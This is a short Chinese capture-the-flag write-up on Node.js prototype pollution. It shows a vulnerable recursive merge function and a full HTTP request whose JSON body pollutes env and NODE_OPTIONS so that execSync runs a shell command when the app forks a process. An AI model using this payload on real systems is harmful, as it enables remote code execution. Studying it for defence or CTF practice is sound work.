## 分析

这里存在原型污染

```javascript
merge(target, source) {
    for (let key in source) {
        if (this.isValidKey(key)){
            if (this.isObject(target[key]) && this.isObject(source[key])) {
                this.merge(target[key], source[key]);
            } else {
                target[key] = source[key];
            }
        }
    }
    return target;
},

clone(target) {
    return this.merge({}, target);
}
```

这里可以污染`env`环境变量，然后程序会`fork`一个进程，这时候会调用到环境变量，然后利用环境变量来执行命令

```
POST /api/calculate HTTP/1.1
Host: 167.71.137.246:31406
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:100.0) Gecko/20100101 Firefox/100.0
Accept: */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Referer: http://167.71.137.246:31406/
Content-Type: application/json
Origin: http://167.71.137.246:31406
Content-Length: 196
Connection: close

{"name":"Kenny Baker",
"constructor":{
"prototype":{"env":{"EVIL":"console.log(require('child_process').execSync('cat flag*').toString())//"
},
"NODE_OPTIONS":"--require /proc/self/environ"}}}
```


接着再访问`http://167.71.137.246:31406/debug/version`即可

# 参考链接

[https://book.hacktricks.xyz/pentesting-web/deserialization/nodejs-proto-prototype-pollution](https://book.hacktricks.xyz/pentesting-web/deserialization/nodejs-proto-prototype-pollution)
